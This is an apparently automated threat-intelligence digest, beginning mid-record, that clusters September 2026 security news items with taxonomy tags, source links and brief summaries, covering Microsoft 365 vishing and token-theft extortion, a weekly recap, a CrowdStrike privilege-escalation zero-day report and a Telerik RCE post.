- threat_categories: credential_theft, mfa_bypass, phishing_social_eng, ransomware_extortion
- actor_attribution: ShinyHunters
- affected_products: Microsoft 365
- content_type: incident_report, news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, mfa_bypass
- affected_products: Microsoft 365
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Threat hunters have disclosed details of a widespread data theft and extortion threat cluster that's targeting Microsoft 365 and other software-as-a-service (SaaS) offerings through information technology (IT) help desk vishing, adversary-in-the-middle (AitM) token theft, and residential-proxy sign-ins. The activity, which mainly singles out directors, vice presidents, and other executive staff
```

#### Corroborating sources (3)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Fake IT Calls Target Executives in Microsoft 365 Data Theft and Extortion Attacks
  - Published: 2026-09-07T15:51:56+00:00
  - Link: https://thehackernews.com/2026/09/microsoft-365-attackers-use-help-desk.html
  - Summary: Threat hunters have disclosed details of a widespread data theft and extortion threat cluster that's targeting Microsoft 365 and other software-as-a-service (SaaS) offerings through information technology (IT) help desk vishing, adversary-in-the-middle (AitM) token theft, and residential-proxy sign-ins. The activity, which mainly singles out directors, vice presidents, and other executive staff
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Voice Callers Exploit BYOD to Reach Microsoft 365, Corporate Data
  - Published: 2026-09-10T20:36:03+00:00
  - Link: https://www.darkreading.com/threat-intelligence/voice-callers-exploit-byod-microsoft-365-corporate-data
  - Summary: Threat actors are leveraging Microsoft's Graph API to identify lucrative targets, then passing their access to extortion groups like ShinyHunters.
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Hackers Favor US Eastern Business Hours in M365 Phishing Campaign
  - Published: 2026-09-11T13:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/hackers-us-business-hours-m365/
  - Summary: KnowBe4 researchers observed a new phishing campaign leveraging Microsoft 365’s Direct Send to send malicious emails

### Cluster 914803cf7c — score 8

- Title: ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-07T14:36:07+00:00
- Link: https://thehackernews.com/2026/09/weekly-recap-chrome-0-day-router.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- content_type: intel_roundup
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain
- content_type: intel_roundup
- confidence_tier: tier_4_news

#### Summary

```
Turning off email images should at least stop the pictures. This week, attackers had a workaround: a scannable QR code built out of text. It still appears, even with images blocked. A small detail, but an annoying one if that was a precaution you were counting on. Elsewhere, a trusted software source delivered code that stole credentials, and a protocol designed for secure network management
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More
  - Published: 2026-09-07T14:36:07+00:00
  - Link: https://thehackernews.com/2026/09/weekly-recap-chrome-0-day-router.html
  - Summary: Turning off email images should at least stop the pictures. This week, attackers had a workaround: a scannable QR code built out of text. It still appears, even with images blocked. A small detail, but an annoying one if that was a precaution you were counting on. Elsewhere, a trusted software source delivered code that stole credentials, and a protocol designed for secure network management

### Cluster 817be3097f — score 8

- Title: Researcher Publishes CrowdStrike Privilege Escalation Zero Day
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-09-07T08:28:00+00:00
- Link: https://www.infosecurity-magazine.com/news/crowdstrike-privilege-escalation/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A security researcher has posted a zero-day exploit in CrowdStrike which could allow hackers to escalate privileges
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Researcher Publishes CrowdStrike Privilege Escalation Zero Day
  - Published: 2026-09-07T08:28:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/crowdstrike-privilege-escalation/
  - Summary: A security researcher has posted a zero-day exploit in CrowdStrike which could allow hackers to escalate privileges

### Cluster 4933c82778 — score 8

- Title: From Padding Oracle to Shell: Unauthenticated RCE in Telerik UI for ASP.NET AJAX
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-09-07T03:47:14+00:00
- Link: https://www.reddit.com/r/netsec/comments/1w9h4ng/from_padding_oracle_to_shell_unauthenticated_rce/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/_pimps [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: From Padding Oracle to Shell: Unauthenticated RCE in Telerik UI for ASP.NET AJAX
  - Published: 2026-09-07T03:47:14+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1w9h4ng/from_padding_oracle_to_shell_unauthenticated_rce/
  - Summary: submitted by /u/_pimps [link] [comments]
